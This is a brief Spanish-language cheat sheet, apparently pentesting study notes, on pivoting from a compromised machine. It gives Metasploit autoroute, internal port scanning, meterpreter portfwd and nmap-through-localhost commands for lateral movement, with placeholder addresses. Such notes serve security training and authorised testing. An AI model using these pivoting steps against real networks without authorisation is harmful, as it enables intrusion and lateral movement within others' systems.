Técnica para acceder a redes internas desde una máquina comprometida.

• Acceso a redes internas  
• Escaneo desde la víctima  
• Movimiento lateral

---

## Identificar red interna

Dentro de la máquina comprometida:

```
ipconfig
```

---

## Autoroute (Metasploit)

Agrega rutas hacia redes internas.

```
run autoroute -s IP/MASK
```

---

## Escaneo interno (Metasploit)

```
use auxiliary/scanner/portscan/tcp
```

	set RHOSTS IP_INTERNA

---

## Port Forwarding

Redirige puertos internos hacia tu máquina.

```
portfwd add -l PUERTO_HOST -p PORT_INTERNO -r IP_INTERNA
```


---

## Escaneo desde localhost

```
nmap -p PORT_LOCAL localhost
```
